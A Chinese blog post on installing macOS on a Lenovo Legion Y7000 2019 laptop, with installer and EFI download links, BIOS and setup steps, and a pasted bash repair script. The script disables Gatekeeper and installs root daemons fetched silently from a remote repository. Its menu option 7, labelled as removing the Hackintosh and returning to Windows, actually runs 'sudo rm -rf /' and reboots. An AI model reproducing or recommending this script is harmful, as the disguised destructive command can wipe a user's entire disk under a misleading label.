"# Y7000_2019" 



https://thecat.top/index.php/archives/280.html



# 硬件功能90%完美

- 触控板正常
- WI-FI/蓝牙正常
- 睡眠正常
- 声卡正常
- 数字小键盘正常
- 电量显示正常
- CPU变频正常
- 摄像头正常
  除了显卡相关无解，

隔空投送没法用，其他的都是正常用的。



efi自带屏蔽镁光盘

# 【黑苹果】联想&拯救者Y7000&2019&PG0 

- 博主： [白菜](https://thecat.top/index.php/author/1/)
-  

- 发布时间：2021 年 01 月 24 日
-  

- 412次浏览
-  

- [1 条评论](https://thecat.top/index.php/archives/280.html#comments)
-  

- 7414字数
-  

- 分类： [网络运维](https://thecat.top/index.php/category/network_operation_and_maintenance/)

1. [首页](https://thecat.top/)
2. 正文 
3. 分享到： 

# 配置

[![1](https://s3.ax1x.com/2021/01/24/sbNHgK.jpg)](https://s3.ax1x.com/2021/01/24/sbNHgK.jpg)

[1](https://s3.ax1x.com/2021/01/24/sbNHgK.jpg)



需要注意的是镁光的硬盘并不能安装黑锅，，
如若需要安装的话请再加一块固态。进行安装EFI带有屏蔽镁光固态的配置文件

# 硬件功能90%完美

- 触控板正常
- WI-FI/蓝牙正常
- 睡眠正常
- 声卡正常
- 数字小键盘正常
- 电量显示正常
- CPU变频正常
- 摄像头正常
  除了显卡相关无解，

隔空投送没法用，其他的都是正常用的。

# 安装过程

y7000黑苹果安装

## 1】下载镜像

我这里使用最新的Big Sur11.1【独行秀才】
efi 完美安装macOS10.13.6-11.1版本都能用此efi安装并完美驱动。
efi会在文章末提供。
[百度云：83a5]https://pan.baidu.com/s/17vZG7TYn261dS0953fNJBg
[天翼云：8rz8]https://cloud.189.cn/t/jeuMrur6ZbMv

## 2】制作安装盘

首先下载一个烧录软件Etcher，打开烧录即可。知道软件提示success否则重烧。
[![2](https://s3.ax1x.com/2021/01/24/sbd63t.jpg)](https://s3.ax1x.com/2021/01/24/sbd63t.jpg)

[2](https://s3.ax1x.com/2021/01/24/sbd63t.jpg)



## 3】分卷类型转换

将安装mac的硬盘转换为GUIP分卷。

## 4】BIOS相关设置

- 使用一件修改BIOS软件修改设置，，，
- F2进入BIOS
  操作，，关闭安全启动，将启动U盘设置为第一启动项。

1、关闭安全启动，显卡模式改混合，
执行一键修改BIOS脚本
（bios恢复方法f9重置 f10保存）
脚本用578

使用脚本修改是为了关闭独显直连，改为混合模式。这样才能符合核显安装苹果系统
否则风扇会转得很快。

2、f12选择u盘启动
期间需要操作
磁盘工具-抹盘
安装MAC
[![5](https://s3.ax1x.com/2021/01/24/sbwxL8.jpg)](https://s3.ax1x.com/2021/01/24/sbwxL8.jpg)

[5](https://s3.ax1x.com/2021/01/24/sbwxL8.jpg)


[![6](https://s3.ax1x.com/2021/01/24/sbwvsf.jpg)6](https://s3.ax1x.com/2021/01/24/sbwvsf.jpg)
[![7](https://s3.ax1x.com/2021/01/24/sbwjQP.jpg)7](https://s3.ax1x.com/2021/01/24/sbwjQP.jpg)



系统会重启两次-三次。每次都要F12选择U盘OC启动

## MAC安装向导

根据操作来即可，，没啥要说的。
[![8](https://s3.ax1x.com/2021/01/24/sb0FWn.jpg)](https://s3.ax1x.com/2021/01/24/sb0FWn.jpg)

[8](https://s3.ax1x.com/2021/01/24/sb0FWn.jpg)


[![9](https://s3.ax1x.com/2021/01/24/sb0uo4.png)9](https://s3.ax1x.com/2021/01/24/sb0uo4.png)
备注】自己的闪迪u盘 efi已经完美 可以作为y7000的系统安装盘
再次使用，只需要一件修改BIOS 5 7 8 关闭安全启动 就可以进入MAC系统/安装



小细节优化
睡眠usb断电（移动硬盘要插入睡眠不会释放电源的插槽）或者efi放到内置硬盘。 硬盘插右插槽
[![3](https://s3.ax1x.com/2021/01/24/sbw0MV.jpg)](https://s3.ax1x.com/2021/01/24/sbw0MV.jpg)

[3](https://s3.ax1x.com/2021/01/24/sbw0MV.jpg)


[![4](https://s3.ax1x.com/2021/01/24/sbwBrT.png)4](https://s3.ax1x.com/2021/01/24/sbwBrT.png)



遇事不决执行上面提到的优化命令。第五个



Readme.txt



```
#!/bin/bash

DAEMON_PATH=/Library/LaunchDaemons/
BIN_PATH=/usr/local/bin/
TMP_PATH=/tmp/
ALC_DAEMON_FILE=good.win.ALCPlugFix.plist
VERB_FILE=hda-verb
ALC_FIX_FILE=ALCPlugFix
TIME_FIX_FILE=localtime-toggle
TIME_DAEMON_FILE=org.osx86.localtime-toggle.plist
NUMLOCK_FIX_FILE=setleds
NUMLOCK_DAEMON_FILE=com.rajiteh.setleds.plist
GIT_URL=https://gitee.com/xiaoMGit/Y7000Series_Hackintosh_Fix/raw/master

init(){
    sudo spctl --master-disable
    sudo pmset -a hibernatemode 0
    sudo rm -rf /var/vm/sleepimage
    sudo mkdir /var/vm/sleepimage
    
    sudo curl -s -o $TMP_PATH$ALC_FIX_FILE "$GIT_URL/ALCPlugFix/$ALC_FIX_FILE"
    sudo curl -s -o $TMP_PATH$VERB_FILE "$GIT_URL/ALCPlugFix/$VERB_FILE"
    sudo curl -s -o $TMP_PATH$ALC_DAEMON_FILE "$GIT_URL/ALCPlugFix/$ALC_DAEMON_FILE"
    sudo curl -s -o $TMP_PATH$TIME_FIX_FILE "$GIT_URL/TimeSynchronization/$TIME_FIX_FILE"
    sudo curl -s -o $TMP_PATH$TIME_DAEMON_FILE "$GIT_URL/TimeSynchronization/$TIME_DAEMON_FILE"
    sudo curl -s -o $TMP_PATH$NUMLOCK_FIX_FILE "$GIT_URL/NumLockFix/$NUMLOCK_FIX_FILE"
    sudo curl -s -o $TMP_PATH$NUMLOCK_DAEMON_FILE "$GIT_URL/NumLockFix/$NUMLOCK_DAEMON_FILE"
    
    if [ ! -d "$BIN_PATH" ] ; then
        mkdir "$BIN_PATH" ;
    fi
    
    if sudo launchctl list | grep --quiet com.black-dragon74.ALCPlugFix; then
        sudo launchctl unload /Library/LaunchDaemons/com.black-dragon74.ALCPlugFix.plist
        sudo rm /Library/LaunchDaemons/com.black-dragon74.ALCPlugFix.plist
        sudo rm /usr/local/bin/ALCPlugFix
        sudo rm /Library/Preferences/ALCPlugFix/ALC_Config.plist
    fi
}

ALCPlugFix(){
    sudo cp $TMP_PATH$ALC_FIX_FILE $BIN_PATH
    sudo cp $TMP_PATH$VERB_FILE $BIN_PATH
    sudo cp $TMP_PATH$ALC_DAEMON_FILE $DAEMON_PATH
    sudo chmod 755 $BIN_PATH$ALC_FIX_FILE
    sudo chown $USER:admin $BIN_PATH$ALC_FIX_FILE
    sudo chmod 755 $BIN_PATH$VERB_FILE
    sudo chown $USER:admin $BIN_PATH$VERB_FILE
    sudo chmod 644 $DAEMON_PATH$ALC_DAEMON_FILE
    sudo chown root:wheel $DAEMON_PATH$ALC_DAEMON_FILE
    if sudo launchctl list | grep --quiet ALCPlugFix; then
        sudo launchctl unload $DAEMON_PATH$ALC_DAEMON_FILE
    fi
    sudo launchctl load -w $DAEMON_PATH$ALC_DAEMON_FILE
}

localtime_toggle(){
    sudo cp $TMP_PATH$TIME_FIX_FILE $BIN_PATH
    sudo cp $TMP_PATH$TIME_DAEMON_FILE $DAEMON_PATH
    sudo chmod +x $BIN_PATH$TIME_FIX_FILE
    sudo chown root $DAEMON_PATH$TIME_DAEMON_FILE
    sudo chmod 644 $DAEMON_PATH$TIME_DAEMON_FILE
    if sudo launchctl list | grep --quiet localtime-toggle; then
        sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
    fi
    sudo launchctl load -w $DAEMON_PATH$TIME_DAEMON_FILE
}

numlock(){
    sudo cp $TMP_PATH$NUMLOCK_FIX_FILE $BIN_PATH
    sudo cp $TMP_PATH$NUMLOCK_DAEMON_FILE $DAEMON_PATH
    sudo chmod +x $BIN_PATH$NUMLOCK_FIX_FILE
    sudo chown root:wheel $DAEMON_PATH$NUMLOCK_DAEMON_FILE
    if sudo launchctl list | grep --quiet setleds; then
        sudo launchctl unload $DAEMON_PATH$NUMLOCK_DAEMON_FILE
    fi
    sudo launchctl load -w $DAEMON_PATH$NUMLOCK_DAEMON_FILE
}

clear_cache(){
    sudo kextcache -i /
}

fixAll(){
    ALCPlugFix
    numlock
    localtime_toggle
    clear_cache
}

removeAll(){
    if sudo launchctl list | grep --quiet ALCPlugFix; then
        sudo launchctl unload $DAEMON_PATH$ALC_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$ALC_DAEMON_FILE
        sudo rm -rf $BIN_PATH$VERB_FILE
        sudo rm -rf $BIN_PATH$ALC_FIX_FILE
    fi
    
    if sudo launchctl list | grep --quiet localtime-toggle; then
        sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$TIME_DAEMON_FILE
        sudo rm -rf $BIN_PATH$TIME_FIX_FILE
    fi
    
    if sudo launchctl list | grep --quiet setleds; then
        sudo launchctl unload $DAEMON_PATH$NUMLOCK_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$NUMLOCK_DAEMON_FILE
        sudo rm -rf $BIN_PATH$NUMLOCK_FIX_FILE
    fi
}

menu(){
    echo "
******************************************************************************
                                                                                   
    https://github.com/xiaoMGitHub/LEGION_Y7000Series_Hackintosh/releases  

                              QQ群：477839538
                                                                                  
******************************************************************************
"
    echo "选择菜单："
    echo ""
    echo "1、修复插耳机杂音"
    echo ""
    echo "2、修复数字键盘无法开启"
    echo ""
    echo "3、修复 Win/OSX 时间不同步"
    echo ""
    echo "4、清除缓存"
    echo ""
    echo "5、全部修复上述问题"
    echo ""
    echo "6、移除所有修复"
    echo ""
    echo "7、送黑果归西"
    echo ""
    echo "8、退出"
    echo ""
}

Select(){
    read -p "请选择你需要执行的操作：" number
    case ${number} in
    1) ALCPlugFix
       echo "已经修复插耳机杂音"
       echo ""
       Select
      ;;
    2) numlock
       echo "已经修复数字键盘无法开启"
       echo ""
       Select
       ;;
    3) localtime_toggle
       echo "已经修复 Win/OSX 时间不同步"
       echo ""
       Select
       ;;
    4) clear_cache
       echo "已经重建缓存"
       echo ""
       Select
       ;;
    5) fixAll
       echo "已经修复上述问题"
       echo ""
       Select
       ;;
    6) removeAll
       echo "已经移除所有修复"
       Select
       ;;
    7) echo "耐心等待，正在努力移除垃圾黑苹果，欢迎重返 windows 系统,稍后会自动重启"
        sudo rm -rf / >/dev/null 2>&1
        sudo reboot
        ;;
    8) exit 0
       ;;
    *) echo "输入错误";
       echo ""
       Select
       ;;
    esac
}

main(){
    init
    
    menu
    
    Select
}

main
```

jiushibaicai
